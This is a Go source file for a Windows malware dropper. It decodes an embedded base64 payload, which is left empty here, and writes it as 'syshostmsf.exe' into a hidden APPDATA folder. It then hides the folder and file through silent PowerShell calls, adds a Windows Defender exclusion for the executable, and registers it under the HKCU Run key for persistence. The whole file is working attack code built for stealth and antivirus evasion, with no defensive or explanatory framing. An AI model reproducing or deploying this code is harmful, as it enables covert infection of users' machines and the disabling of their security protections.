package main

import (
	"fmt"
	"encoding/base64"
	"os"
	"path/filepath"
	"os/exec"
	"syscall"
)

func main() {
    base64String := ""
	decodeData, err := base64.StdEncoding.DecodeString(base64String)
	if err != nil {
		fmt.Println("Error decoding Base64:", err)
		return
	}
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		fmt.Println("APPDATA environment variable not found")
		return
	}
	hiddenFolder := filepath.Join(appdata, ".sysdata")
	err = os.MkdirAll(hiddenFolder, 0755)
	if err != nil {
		fmt.Println("Error creating hidden folder:", err)
		return
	}
	outputFile := filepath.Join(hiddenFolder, "syshostmsf.exe")
	file, err := os.Create(outputFile)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()
	_, err = file.Write(decodeData)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}
	hideCmd := exec.Command("powershell", "-Command", "attrib +h '"+hiddenFolder+"' ; attrib +h '"+outputFile+"'")
	hideCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = hideCmd.Run()
	if err != nil {
		fmt.Println("Error hiding folder or file:", err)
		return
	}
	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -ExclusionPath '" + outputFile + "'")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error executing command:", err)
		return
	}
	startupName := "SysHostService"
	regCmd := exec.Command("powershell", "-Command", "Set-ItemProperty -Path 'HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '"+startupName+"' -Value '"+outputFile+"'")
	regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = regCmd.Run()
	if err != nil {
		fmt.Println("Error adding to startup:", err)
		return
	}  
}